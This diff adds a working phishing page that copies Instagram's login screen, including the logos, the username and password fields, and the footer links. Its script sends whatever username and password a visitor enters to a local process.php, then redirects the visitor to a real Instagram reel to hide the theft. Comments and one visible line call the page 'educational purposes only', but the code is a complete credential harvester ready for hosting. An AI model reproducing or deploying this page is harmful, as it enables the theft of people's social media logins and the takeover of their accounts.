@@ -1,0 +1,123 @@
+<!-- ONLY FOR EDUCATIONAL PURPOSES -->
+<!-- ТІЛЬКИ ДЛЯ НАВЧАЛЬНИХ ЦІЛЕЙ -->
+
+<!-- ВИКОРИСТАННЯ ЗАБОРОНЕНО -->
+<!-- USING DON'T ALLOWED -->
+
+<head>
+  <link rel="Icon" type="image/x-icon" href="images/instagram_logo.png">
+  <title>Instagram</title>
+</head>
+<body>
+  <span id="root">
+    <section class="section-all">
+      <link rel="stylesheet" href="css.css">
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo" src="images/Instagram_logo_text.png" alt="Instagram">
+                </div><!-- Header end -->
+                <div class="form-wrap">
+                  <form class="form">
+
+                    <div class="input-box">
+                      <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
+                    </div>  
+
+                    <div class="input-box">
+                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                    </div>  
+
+                    <span class="button-box">
+                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
+                    </span>  
+
+                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
+                  </form>
+                </div> <!-- Form-wrap end -->
+              </div> <!-- Login-box end -->
+
+              <div class="login-box">
+                <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
+              </div> <!-- Signup-box end -->
+
+              <div class="app">
+                <p>! THIS SITE ONLY FOR EDUCATIONAL PURPOSES !<p>
+                <p>Get the app.</p>
+                <div class="app-img">
+                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                    <img src="images/app_store.png" >
+                  </a>
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                    <img src="images/google_play.png">
+                  </a>  
+                </div>  <!-- App-img end-->
+              </div> <!-- App end -->
+            </div> <!-- Content end -->
+          </article>
+        </div> <!-- Wrapper end -->
+      </main>
+
+      <!-- 2-Role Footer -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+
+          <nav class="footer-nav" role="navigation">
+            <ul>
+			  <li><a href=""></a></li>
+              <li><a href="https://about.instagram.com">About Us</a></li>
+              <li><a href="https://help.instagram.com">Support</a></li>
+              <li><a href="https://about.instagram.com/blog">Blog</a></li>
+              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
+              <li><a href="https://www.instagram.com/developer">Api</a></li>
+              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
+              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
+              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
+			  <li><a href="">Intsagram</a></li>
+            </ul>
+          </nav>
+
+          <span class="footer-logo">&copy; 2024 Instagram</span>
+        </div> <!-- Footer container end -->
+      </footer>
+      
+    </section>
+  </span> <!-- Root -->
+
+  <!-- Select Link -->
+  <script type="text/javascript">
+    function la(src) {
+      window.location=src;
+    }
+  </script>
+
+  <script>
+function sendMessage() {
+    var request = new XMLHttpRequest();
+    request.open("POST", "process.php");  // call the PHP script
+    request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+    var params = "username=" + encodeURIComponent(document.getElementById('username').value) +
+                 "&password=" + encodeURIComponent(document.getElementById('password').value);
+
+    request.send(params);
+
+    // Handle the response if needed
+    request.onreadystatechange = function() {
+        if (request.readyState == XMLHttpRequest.DONE) {
+            if (request.status == 200) {
+                // Handle success if needed
+                window.location.replace("https://www.instagram.com/reels/C02dKNHIaj1/");
+            } else {
+                // Handle error if needed
+                console.error("Error: " + request.status);
+            }
+        }
+    };
+}
+  </script>
+</body>
